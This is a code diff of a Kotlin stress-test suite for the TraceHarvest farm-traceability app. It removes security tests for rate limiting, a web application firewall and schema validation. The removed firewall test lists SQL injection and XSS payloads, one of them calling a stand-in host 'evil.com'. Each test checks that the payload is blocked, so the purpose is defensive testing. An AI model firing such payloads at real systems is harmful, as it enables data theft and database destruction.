@@ -11,10 +11,6 @@ import com.example.data.local.AppDatabase
 import com.example.data.local.entity.FarmerEntity
 import com.example.data.local.entity.HarvestBatchEntity
 import com.example.data.repository.TraceHarvestRepository
-import com.example.data.security.ExporterRole
-import com.example.data.security.SecurityActionOutcome
-import com.example.data.security.SecurityEngine
-import com.example.data.security.SecurityLayer
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.async
 import kotlinx.coroutines.awaitAll
@@ -37,11 +33,10 @@ import java.util.concurrent.atomic.AtomicInteger
  * TraceHarvest Comprehensive Stress & Resilience Test Suite
  *
  * Strains, fuzzes, and stress-tests:
- * 1. Security Engine & WAF (Brute-force rate limiting, SQLi/XSS attack vectors, schema tampering)
- * 2. USSD Gateway (Concurrent sessions, malformed inputs, nested navigation stress)
- * 3. SMS Gateway (High volume inbound messages, dialect variants, unknown commands)
- * 4. Room Database & Repository (Concurrent writes, boundary values, zero/extreme metrics)
- * 5. MRL & SPS Quarantine Engine (Case-insensitive banned chemical evasion detection)
+ * 1. USSD Gateway (Concurrent sessions, malformed inputs, nested navigation stress)
+ * 2. SMS Gateway (High volume inbound messages, dialect variants, unknown commands)
+ * 3. Room Database & Repository (Concurrent writes, boundary values, zero/extreme metrics)
+ * 4. MRL & SPS Quarantine Engine (Case-insensitive banned chemical evasion detection)
  */
 @RunWith(RobolectricTestRunner::class)
 @Config(sdk = [36])
@@ -49,7 +44,6 @@ class AppStressTest {
 
     private lateinit var database: AppDatabase
     private lateinit var repository: TraceHarvestRepository
-    private lateinit var securityEngine: SecurityEngine
     private lateinit var ussdEngine: UssdEngine
     private lateinit var smsEngine: SmsEngine
 
@@ -60,7 +54,6 @@ class AppStressTest {
             .allowMainThreadQueries()
             .build()
         repository = TraceHarvestRepository(database.traceHarvestDao())
-        securityEngine = SecurityEngine()
         ussdEngine = UssdEngine()
         smsEngine = SmsEngine()
     }
@@ -71,128 +64,7 @@ class AppStressTest {
     }
 
     // =========================================================================
-    // 1. SECURITY & WAF BRUTE-FORCE & STRAIN TESTING
-    // =========================================================================
-
-    @Test
-    fun `stress test rate limiter by brute-forcing 1000 requests against exporter endpoint`() {
-        val jwt = securityEngine.generateJwt(
-            ExporterRole.CERTIFIED_EXPORTER,
-            "Olam Agri Nigeria",
-            "usr_olam_stress_01"
-        )
-
-        val allowedCount = AtomicInteger(0)
-        val blockedCount = AtomicInteger(0)
-
-        // Reset rate limiter to 300 RPM
-        securityEngine.resetRateLimitTokens()
-
-        // Brute force 1000 requests in rapid succession
-        for (i in 1..1000) {
-            val event = securityEngine.simulateRequest(
-                endpoint = "/api/v1/export/batches/query",
-                method = "GET",
-                clientIp = "102.89.44.${i % 250}",
-                clientIdentity = "Exporter Terminal #$i",
-                jwtToken = jwt
-            )
-
-            if (event.outcome == SecurityActionOutcome.ALLOWED_200) {
-                allowedCount.incrementAndGet()
-            } else if (event.outcome == SecurityActionOutcome.BLOCKED_429_RATE_LIMITED) {
-                blockedCount.incrementAndGet()
-            }
-        }
-
-        // Exactly 300 requests should be permitted within the rate limit window; remainder 700 must be blocked with 429
-        assertEquals(300, allowedCount.get())
-        assertEquals(700, blockedCount.get())
-        assertEquals(0, securityEngine.getRemainingTokens())
-    }
-
-    @Test
-    fun `fuzz test guardian waf with aggressive sql and xss injection attack vectors`() {
-        val attackVectors = listOf(
-            // SQL Injection payloads
-            "batch_id=' UNION SELECT * FROM users--",
-            "batch_id=1' OR 1=1--",
-            "batch_id=1; DROP TABLE harvest_batches;--",
-            "farmer_code=TH' UNION SELECT password FROM admin--",
-            "export_query=';--",
-            // XSS vectors
-            "notes=<script>alert('xss')</script>",
-            "notes=<SCRIPT>document.cookie</SCRIPT>",
-            "param=javascript:stealTokens()",
-            "img=<img src=x onerror=alert(1)>",
-            "payload=<svg/onload=fetch('//evil.com')>"
-        )
-
-        val jwt = securityEngine.generateJwt(
-            ExporterRole.EU_INSPECTOR,
-            "NVWA Netherlands",
-            "usr_inspector_waf"
-        )
-
-        for (payload in attackVectors) {
-            val event = securityEngine.simulateRequest(
-                endpoint = "/api/v1/export/query?input=" + payload.replace(" ", "%20"),
-                method = "POST",
-                clientIp = "185.220.101.42",
-                clientIdentity = "Malicious Exploit Tester",
-                jwtToken = jwt,
-                payload = payload
-            )
-
-            assertEquals(
-                "Payload should have been intercepted: $payload",
-                SecurityActionOutcome.BLOCKED_403_FORBIDDEN_INJECTION,
-                event.outcome
-            )
-            assertEquals(403, event.httpStatus)
-            assertEquals(SecurityLayer.GUARDIAN_WAF, event.layer)
-        }
-    }
-
-    @Test
-    fun `fuzz test wallarm openapi schema validator with invalid and tampered payloads`() {
-        val invalidPayloads = listOf(
-            // Negative moisture level (violates min: 0.0)
-            "{\"batchCode\":\"NG-SES-2026-0042\",\"moisture_percent\":-15.0}",
-            // Unauthorized MRL override attempt
-            "{\"batchCode\":\"NG-SES-2026-0042\",\"mrl_override\":true,\"approved_by\":\"root\"}",
-            // Tamper hash injection
-            "{\"batchCode\":\"NG-SES-2026-0042\",\"tamper_hash\":\"0x000000000\"}"
-        )
-
-        val jwt = securityEngine.generateJwt(
-            ExporterRole.CERTIFIED_EXPORTER,
-            "Valency Agro",
-            "usr_valency"
-        )
-
-        for (payload in invalidPayloads) {
-            val event = securityEngine.simulateRequest(
-                endpoint = "/api/v1/inspections/mrl-signoff",
-                method = "POST",
-                clientIp = "102.89.34.120",
-                clientIdentity = "Tampered Client Terminal",
-                jwtToken = jwt,
-                payload = payload
-            )
-
-            assertEquals(
-                "Wallarm API Firewall should block invalid schema payload: $payload",
-                SecurityActionOutcome.BLOCKED_400_SCHEMA_VIOLATION,
-                event.outcome
-            )
-            assertEquals(400, event.httpStatus)
-            assertEquals(SecurityLayer.WALLARM_FIREWALL, event.layer)
-        }
-    }
-
-    // =========================================================================
-    // 2. USSD GATEWAY PROTOCOL & NAVIGATION STRESS TESTING
+    // 1. USSD GATEWAY PROTOCOL & NAVIGATION STRESS TESTING
     // =========================================================================
 
     @Test
